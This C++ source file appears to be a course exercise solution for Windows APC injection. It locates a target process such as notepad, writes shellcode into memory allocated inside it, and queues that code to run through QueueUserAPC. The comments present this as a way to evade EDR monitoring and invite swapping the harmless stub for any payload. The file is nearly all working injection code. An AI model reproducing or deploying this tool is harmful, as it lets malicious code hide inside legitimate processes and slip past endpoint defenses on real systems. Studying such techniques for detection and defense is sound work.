/*
  Module 16 — Injection Variants
  Exercise 01 Solution — APC Injection
  ======================================
  Injects shellcode into a running target process by queuing an Asynchronous
  Procedure Call (APC) to one of its threads.

  Technique overview:
    - APCs are kernel-scheduled callbacks that run in the context of a specific
      thread when that thread enters an "alertable" wait state (e.g. SleepEx,
      WaitForSingleObjectEx, MsgWaitForMultipleObjectsEx with MWMO_ALERTABLE).
    - Because we use QueueUserAPC instead of CreateRemoteThread, we avoid the
      suspicious CreateRemoteThread API call that most EDRs watch closely.
    - Limitation: the target thread MUST enter an alertable wait for the APC
      to fire. GUI threads (like notepad's main thread) do this naturally when
      idle; background threads often do not.

  Compile:
    g++ -std=c++17 -Wall -o sol01.exe sol01_apc_inject.cpp -lkernel32 -luser32

  Run (as user or admin):
    sol01.exe notepad.exe
    (launch notepad.exe first, then run this tool)
*/

#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>

// Minimal x64 shellcode: sub/add rsp (shadow space) + NOP sled + ret.
// Replace with any position-independent shellcode payload.
static const BYTE TEST_SHELLCODE[] = {
    0x48, 0x83, 0xEC, 0x28,  // sub rsp, 0x28
    0x48, 0x31, 0xC9,        // xor rcx, rcx
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // NOP sled
    0x48, 0x83, 0xC4, 0x28,  // add rsp, 0x28
    0xC3                      // ret
};

// ---------------------------------------------------------------------------
// findTargetPid
// ---------------------------------------------------------------------------
// Enumerate all running processes with a Toolhelp snapshot and return the
// PID of the first process whose executable name matches targetName
// (case-insensitive). Returns 0 if not found.
DWORD findTargetPid(const char* targetName) {
    // Take a snapshot of all processes in the system.
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        printf("[-] CreateToolhelp32Snapshot failed: %lu\n", GetLastError());
        return 0;
    }

    PROCESSENTRY32 pe = {};
    pe.dwSize = sizeof(pe);

    DWORD foundPid = 0;

    if (Process32First(snap, &pe)) {
        do {
            // pe.szExeFile is the base name (e.g. "notepad.exe"), not a full path.
            if (_stricmp(pe.szExeFile, targetName) == 0) {
                foundPid = pe.th32ProcessID;
                break;  // take the first match
            }
        } while (Process32Next(snap, &pe));
    }

    CloseHandle(snap);
    return foundPid;
}

// ---------------------------------------------------------------------------
// findAlertableThread
// ---------------------------------------------------------------------------
// Enumerate all threads on the system and return a HANDLE (with
// THREAD_SET_CONTEXT access) to the first thread whose owner PID matches pid.
//
// Any thread belonging to the target process will do; the APC fires in
// whichever thread next enters an alertable wait. GUI processes typically
// have a message-pump thread that calls MsgWaitForMultipleObjectsEx with
// MWMO_ALERTABLE, so it is usually alertable when the window is idle.
HANDLE findAlertableThread(DWORD pid) {
    // Snapshot of ALL threads (second arg is ignored for TH32CS_SNAPTHREAD).
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        printf("[-] CreateToolhelp32Snapshot(THREAD) failed: %lu\n", GetLastError());
        return nullptr;
    }

    THREADENTRY32 te = {};
    te.dwSize = sizeof(te);

    HANDLE hThread = nullptr;

    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                // THREAD_SET_CONTEXT is the minimum required for QueueUserAPC.
                hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                if (hThread) {
                    printf("[*] Found thread TID=%lu in PID=%lu\n",
                           te.th32ThreadID, pid);
                    break;
                }
                // OpenThread can fail for system threads; keep looking.
            }
        } while (Thread32Next(snap, &te));
    }

    CloseHandle(snap);
    return hThread;  // caller must CloseHandle
}

// ---------------------------------------------------------------------------
// apcInject
// ---------------------------------------------------------------------------
// Full APC injection sequence:
//   1. OpenProcess — needs VM_WRITE + VM_OPERATION to allocate/write remotely.
//   2. VirtualAllocEx — allocate RWX page in the target process.
//   3. WriteProcessMemory — copy shellcode into that allocation.
//   4. VirtualProtectEx — harden to RX (write permission removed post-copy).
//   5. findAlertableThread — get a handle to any thread in the process.
//   6. QueueUserAPC — register shellcode as an APC for that thread.
//   7. Cleanup handles.
bool apcInject(DWORD pid, const BYTE* shellcode, size_t len) {
    // Step 1: Open the target process.
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION,
        FALSE, pid);
    if (!hProcess) {
        printf("[-] OpenProcess failed: %lu\n", GetLastError());
        return false;
    }

    // Step 2: Allocate RWX memory in the target.
    LPVOID remoteMem = VirtualAllocEx(
        hProcess, nullptr, len,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        printf("[-] VirtualAllocEx failed: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return false;
    }
    printf("[+] Allocated remote memory at %p\n", remoteMem);

    // Step 3: Write shellcode into the remote allocation.
    SIZE_T written = 0;
    if (!WriteProcessMemory(hProcess, remoteMem, shellcode, len, &written)
        || written != len) {
        printf("[-] WriteProcessMemory failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    printf("[+] Wrote %zu bytes of shellcode\n", written);

    // Step 4 (optional hardening): Switch to PAGE_EXECUTE_READ so the
    // shellcode page is no longer writable — reduces the EDR alert surface.
    DWORD oldProtect = 0;
    VirtualProtectEx(hProcess, remoteMem, len, PAGE_EXECUTE_READ, &oldProtect);

    // Step 5: Find a thread in the target process to receive the APC.
    HANDLE hThread = findAlertableThread(pid);
    if (!hThread) {
        printf("[-] No suitable thread found in PID=%lu\n", pid);
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // Step 6: Queue the APC. When the thread enters an alertable wait
    // (SleepEx, WaitForSingleObjectEx, etc.) it will call remoteMem(0).
    //
    // PAPCFUNC signature: VOID CALLBACK ApcFunc(ULONG_PTR dwParam)
    // We cast remoteMem to PAPCFUNC — the shellcode stub ignores the argument.
    DWORD queueResult = QueueUserAPC(
        (PAPCFUNC)(ULONG_PTR)remoteMem,
        hThread,
        0 /* dwData — passed to shellcode as rcx/first arg */);

    if (!queueResult) {
        printf("[-] QueueUserAPC failed: %lu\n", GetLastError());
        CloseHandle(hThread);
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    printf("[+] APC queued to thread %p in PID=%lu\n", hThread, pid);

    // Step 7: Cleanup.
    CloseHandle(hThread);
    CloseHandle(hProcess);
    // Note: do NOT free remoteMem — the shellcode hasn't run yet.
    // In a real tool you would track the allocation and free it after
    // the shellcode signals completion (e.g. via a named event).

    return true;
}

// ---------------------------------------------------------------------------
// main
// ---------------------------------------------------------------------------
int main(int argc, char* argv[]) {
    const char* target = (argc > 1) ? argv[1] : "notepad.exe";

    printf("[*] APC Injection — Module 16 Exercise 01 Solution\n");
    printf("[*] Looking for process: %s\n", target);

    DWORD pid = findTargetPid(target);
    if (!pid) {
        printf("[-] Process not found. Launch %s first.\n", target);
        return 1;
    }
    printf("[+] Found PID: %lu\n", pid);

    printf("[*] Attempting APC injection...\n");
    if (apcInject(pid, TEST_SHELLCODE, sizeof(TEST_SHELLCODE))) {
        printf("[+] APC queued successfully.\n");
        printf("[*] Shellcode fires when the target thread enters an alertable wait.\n");
        printf("[*] Tip: minimize/restore the notepad window to pump messages.\n");
    } else {
        printf("[-] Injection failed. Error: %lu\n", GetLastError());
        return 1;
    }

    return 0;
}
